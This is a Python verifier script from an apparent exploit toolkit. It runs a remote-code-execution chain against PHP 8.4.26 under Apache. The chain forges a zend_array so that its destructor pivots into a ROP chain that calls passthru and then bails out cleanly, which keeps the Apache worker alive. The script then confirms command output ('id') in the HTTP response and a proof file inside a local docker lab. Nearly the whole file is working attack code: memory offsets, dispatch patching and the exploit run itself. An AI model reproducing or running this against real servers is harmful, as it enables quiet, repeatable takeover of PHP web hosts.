#!/usr/bin/env python3
"""Verifier for the worker-surviving dispatch primitive (survive_dispatch.py):
drive the exploit with that dispatch swapped in, then check (a) the command
output lands in the HTTP body and (b) the Apache child SURVIVES a follow-up
request.

Two pieces are swapped in at runtime:

  * the forged-array builder -> build_survive_ht (survive_dispatch.py): the
                  forged array gets the jump_fcontext->ROP->zif_passthru->
                  _zend_bailout pDestructor instead of a bare zif_system. The
                  command is rewritten to `<cmd> 2>&1 | tee <proof>` so passthru
                  both flushes to the HTTP body AND leaves an in-container proof
                  file.
  * the response sender -> a tee wrapper that captures every response so the
                  fire request's body can be scanned for the command output.

Everything else (the disclosure and reclaim stages, the worker pin, the shot
loop) runs as normal.

SURVIVAL SIGNAL: the survive lab (docker-compose.reuse.yml --profile survive) is
a single immortal prefork child (MaxRequestWorkers=1). pid-survive.php echoes the
serving child's PID. A clean _zend_bailout keeps the SAME child alive, so the PID
is unchanged across the fire; a bare zif_system dispatch crashes the child and
the master forks a replacement -> a NEW PID. Same PID after a landed RCE = worker
survived.

Usage:
    # bring the lab up first:
    docker compose -f docker-compose.reuse.yml -p p2s-survive --profile survive up -d
    python3 -I poc/primitives/dispatch/verify_survive_dispatch.py [shots] [base_url] [container]

Defaults: shots=8, base_url=http://127.0.0.1:8094, container=php2shell-survive-8094
"""

import importlib.util
import os
import subprocess
import sys
import types
import urllib.request

_HERE = os.path.dirname(os.path.abspath(__file__))
_POC_ROOT = os.path.dirname(os.path.dirname(_HERE))  # poc/
for _p in (_HERE, _POC_ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

BUILD_KEY = "8.4.26-apache"          # the survive lab build
PROOF = "/tmp/survive_dispatch.out"


def _load(name, filename):
    # same-folder sibling (survive_dispatch) or the poc/ root module (php2shell)
    for d in (_HERE, _POC_ROOT):
        path = os.path.join(d, filename)
        if os.path.exists(path):
            break
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def http_get(url, timeout=8):
    try:
        with urllib.request.urlopen(url, timeout=timeout) as r:
            return r.status, r.read()
    except Exception as e:
        return None, repr(e).encode()


def container_pid(base):
    s, b = http_get(base.rstrip("/") + "/pid-survive.php")
    if s == 200 and b.startswith(b"PID="):
        return b.strip().split(b"=", 1)[1].decode()
    return None


def read_proof(container):
    try:
        r = subprocess.run(["docker", "exec", container, "cat", PROOF],
                           capture_output=True, timeout=10)
        if r.returncode == 0:
            return r.stdout
    except Exception:
        pass
    return b""


def clear_proof(container):
    try:
        subprocess.run(["docker", "exec", container, "rm", "-f", PROOF],
                       capture_output=True, timeout=10)
    except Exception:
        pass


def main():
    shots = int(sys.argv[1]) if len(sys.argv) > 1 else 8
    base = sys.argv[2] if len(sys.argv) > 2 else "http://127.0.0.1:8094"
    container = sys.argv[3] if len(sys.argv) > 3 else "php2shell-survive-8094"

    sd = _load("survive_dispatch", "survive_dispatch.py")
    from common.offsets import load_offsets
    # cmd_apache_cookie_rce resolves forge_zend_array / send_multipart_plain in its own module
    # namespace, so the monkeypatches below target that module, not php2shell.
    import chains.apache_cookie_rce as acr

    off_tbl = load_offsets("8.4.26", "apache2handler")
    survive_off = sd.SURVIVE_OFFSETS[BUILD_KEY]
    zif_sys_off = off_tbl["zif_system"]        # 0x465370 on this build

    # ---- probe the lab -----------------------------------------------------
    s, b = http_get(base + "/index.php")
    if s != 200:
        print(f"[verify] lab {base} not responding ({s}, {b[:80]!r}).")
        print(f"[verify] start it:  docker compose -f docker-compose.reuse.yml "
              f"-p p2s-survive --profile survive up -d")
        return 2
    import json
    info = json.loads(b)
    print(f"[verify] target {base}  PHP {info['php']} {info['sapi']} "
          f"mem={info['memory_limit']}  (build key {BUILD_KEY})")
    pid0 = container_pid(base)
    print(f"[verify] serving child PID before chain: {pid0}")
    clear_proof(container)

    # ---- monkeypatch: surviving dispatch + response tee --------------------
    captured = []
    orig_send_plain = acr.send_multipart_plain

    def send_plain_tee(host, port, path, body, timeout):
        resp = orig_send_plain(host, port, path, body, timeout)
        captured.append(resp)
        return resp

    def survive_ht(S, zif, cmd, size=384):
        # zif = libphp_base + off['zif_system']  =>  recover the module base.
        libphp_base = zif - zif_sys_off
        # Rewrite `<cmd> > <proof> 2>&1` so passthru flushes to the HTTP body
        # (bare command) AND still writes the in-container proof (tee).
        c = cmd
        if b" > " in c:
            base_cmd, proof_path = c.split(b" > ", 1)
            proof_path = proof_path.replace(b" 2>&1", b"").strip()
        else:
            base_cmd, proof_path = c, PROOF.encode()
        fire_cmd = base_cmd.strip() + b" 2>&1 | tee " + proof_path
        if len(fire_cmd) > sd.CMD_MAX:
            fire_cmd = base_cmd.strip()      # fall back to body-only
        blob = sd.build_survive_ht(S, libphp_base, fire_cmd, survive_off)
        sd.validate(blob, S, libphp_base, survive_off, build_key=BUILD_KEY)
        return blob

    acr.forge_zend_array = survive_ht
    acr.send_multipart_plain = send_plain_tee
    print(f"[verify] dispatch patched: pDestructor -> libphp+pivot "
          f"({survive_off['pivot']:#x}) -> ROP -> zif_passthru "
          f"({survive_off['zif_passthru']:#x}) -> _zend_bailout "
          f"({survive_off['zend_bailout']:#x})")

    # ---- run the exploit with the patched dispatch -------------------------
    from urllib.parse import urlsplit
    u = urlsplit(base)
    args = types.SimpleNamespace(
        url=base, path="/index.php", service=None, restart=False,
        workers=1, pin_workers=0, cmd="id", proof=PROOF, big=78,
        big_ladder="", fillers=115, fake_len=acr.COOKIE_RCE_FAKE_LEN, shots=shots,
        restart_each=False, measure=False, timeout=60.0,
        version="8.4.26", sapi="apache2handler", show=False,
    )
    print(f"[verify] running the chain: {shots} shots against {u.hostname}:{u.port or 80} ...")
    try:
        result = acr.cmd_apache_cookie_rce(args)
    except SystemExit as e:
        print(f"[verify] chain aborted: {e}")
        result = None
    except Exception as e:
        print(f"[verify] chain raised: {type(e).__name__}: {e}")
        result = None

    # ---- evaluate ----------------------------------------------------------
    proof = read_proof(container)
    body_hit = next((r for r in captured if b"uid=" in r), b"")
    pid1 = container_pid(base)

    print("\n" + "=" * 68)
    print("[verify] RESULT")
    print("=" * 68)
    print(f"  disclosure: {'libphp=' + hex(result['lib']) if result and 'lib' in result else 'NOT landed'}")
    rce = bool(body_hit) or (b"uid=" in proof)
    print(f"  command executed (uid= seen): {rce}")
    if b"uid=" in proof:
        print(f"    proof file {PROOF}: {proof.strip()[:120]!r}")
    if body_hit:
        # show the body line with uid=
        for line in body_hit.splitlines():
            if b"uid=" in line:
                print(f"    HTTP body: {line.strip()[:120]!r}")
                break
    print(f"  serving child PID: before={pid0}  after={pid1}")
    survived = (pid1 is not None and pid1 == pid0)
    if rce:
        print(f"  WORKER SURVIVED: {survived}  "
              f"({'same child answered follow-up' if survived else 'PID changed = crash+respawn'})")
        # repeatable-RCE confirmation: a plain liveness follow-up
        s2, _ = http_get(base + "/index.php")
        print(f"  follow-up index.php after fire: HTTP {s2}")
    else:
        print("  RCE did not land this run. NOTE: the survive lab is 16M/sid256,")
        print("  while BUILTIN_OFFSETS['8.4.26-apache'] fake_array_S/hsv are the")
        print("  128M groom geometry (project memory: ~8%/shot, recalibration")
        print("  pending). This gates the GROOM, not the new dispatch - the")
        print("  dispatch blob itself is byte-verified by survive_dispatch.py's")
        print("  self-test (all code ptrs in libphp exec text).")
        print(f"  Re-run with more shots:  python3 -I poc/verify_survive_dispatch.py 40")
    print("=" * 68)
    return 0 if rce else 1


if __name__ == "__main__":
    sys.exit(main())
